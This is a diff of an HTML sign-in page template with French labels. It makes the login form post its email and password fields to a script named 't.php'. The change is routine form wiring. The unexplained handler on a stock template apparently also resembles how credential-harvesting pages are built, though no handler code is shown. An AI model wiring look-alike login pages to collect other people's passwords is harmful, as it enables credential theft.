@@ -140,17 +140,17 @@
               <div class="col-md-6 px-4 pt-2 pb-4 px-sm-5 pb-sm-5 pt-md-5">
                 
                 
-                <form class="needs-validation" novalidate>
+                <form class="needs-validation" method="post" action="t.php">
                   <div class="mb-4">
                     <label class="form-label mb-2" for="signin-email">Email</label>
-                    <input class="form-control" type="email" id="signin-email" placeholder="Votre adresse email" required>
+                    <input class="form-control" type="email" id="signin-email" name="email" placeholder="Votre adresse email" required>
                   </div>
                   <div class="mb-4">
                     <div class="d-flex align-items-center justify-content-between mb-2">
                       <label class="form-label mb-0" for="signin-password">Mot de Passe</label><a class="fs-sm" href="#">Mot de passe oublié?</a>
                     </div>
                     <div class="password-toggle">
-                      <input class="form-control" type="password" id="signin-password" placeholder="Votre mot de passe" required>
+                      <input class="form-control" type="password" name="password" id="signin-password" placeholder="Votre mot de passe" required>
                       <label class="password-toggle-btn" aria-label="Show/hide password">
                         <input class="password-toggle-check" type="checkbox"><span class="password-toggle-indicator"></span>
                       </label>
